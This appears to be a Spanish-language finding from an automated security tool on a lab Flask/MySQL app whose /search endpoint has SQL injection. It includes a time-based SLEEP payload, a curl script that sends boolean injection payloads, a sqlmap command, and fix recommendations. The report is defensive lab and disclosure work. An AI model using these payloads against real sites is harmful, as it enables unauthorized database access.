Descripción Técnica

Escenario de laboratorio de demostración: SQL injection time-based blind en una aplicación Python Flask con backend MySQL. El endpoint /search acepta el parámetro 'q' que se inserta directamente en la consulta SQL sin sanitización mediante interpolación de cadenas (f-string). Un atacante puede inyectar comandos SQL vía el parámetro q; la inyección time-based blind es posible con MySQL SLEEP(): q=1' OR (SELECT 1 FROM (SELECT SLEEP(4)) t)-- - provoca un retraso de 4 segundos. No se requiere autenticación. Demuestra la capacidad de binoracle para detectar y verificar esta clase de vulnerabilidad de forma completamente autónoma.

# COOKIE="nombre=valor"   # <-- si hace falta sesion autenticada, pasala con -b "$COOKIE"

# Confirmacion BOOLEANA (no destructiva): compara una condicion verdadera vs falsa inyectada
# en el parametro sospechoso; si las respuestas difieren de forma consistente, hay SQLi.
# Parametro elegido como inyectable: 'q' (el mas probable segun el nombre; cambialo abajo si no es el correcto).
PAYLOAD_TRUE="' OR '1'='1"
PAYLOAD_FALSE="' OR '1'='2"
DATA_TRUE=(
  --data-urlencode "q=$PAYLOAD_TRUE"
)
DATA_FALSE=(
  --data-urlencode "q=$PAYLOAD_FALSE"
)
RESP_TRUE=$(curl -s -G "${DATA_TRUE[@]}" "$BASE_URL$ENDPOINT")
RESP_FALSE=$(curl -s -G "${DATA_FALSE[@]}" "$BASE_URL$ENDPOINT")
echo "true  -> $(echo -n "$RESP_TRUE" | wc -c) bytes"
echo "false -> $(echo -n "$RESP_FALSE" | wc -c) bytes"
# si difieren (longitud/contenido/codigo), confirma con sqlmap sobre el mismo parametro:
#   sqlmap -u "$BASE_URL$ENDPOINT" --data='q=1' -p q --batch

Recomendaciones

Usar consultas parametrizadas (ORM o cursor.execute con placeholders). Validar y rechazar cualquier entrada que sea usada como identificador SQL. Nunca construir consultas SQL mediante concatenación de cadenas. Actualizar a la versión parcheada lo antes posible.
